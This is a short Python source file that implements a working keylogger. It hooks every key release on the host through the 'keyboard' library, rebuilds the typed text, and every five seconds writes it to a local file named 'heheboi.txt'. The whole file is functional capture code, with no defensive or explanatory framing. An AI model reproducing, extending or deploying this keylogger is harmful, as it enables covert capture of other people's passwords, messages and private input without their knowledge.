import keyboard
from threading import Timer

LOG_FILE_NAME = "heheboi"
UPDATE_TIME = 5

class Keylogger:
    def __init__(self, filename, interval):
        self.log = ""
        self.filename = filename
        self.interval = interval

    def report(self):
        with open(f"{self.filename}.txt", "w") as f:
            print(self.log, file=f)
        timer = Timer(interval = self.interval, function = self.report)
        timer.daemon = True
        timer.start()

    def callback(self, event):
        key = event.name
        if len(key) > 1:
            if key == "enter":
                self.log += "\n"
            elif key == "space":
                self.log += " "
            elif key == "backspace":
                self.log = self.log[:-1]
        else:
            self.log += key

    def start(self):
        keyboard.on_release(callback = self.callback)
        self.report()
        keyboard.wait()

if __name__ == "__main__":
    keylogger = Keylogger(filename = LOG_FILE_NAME, interval = UPDATE_TIME)
    keylogger.start()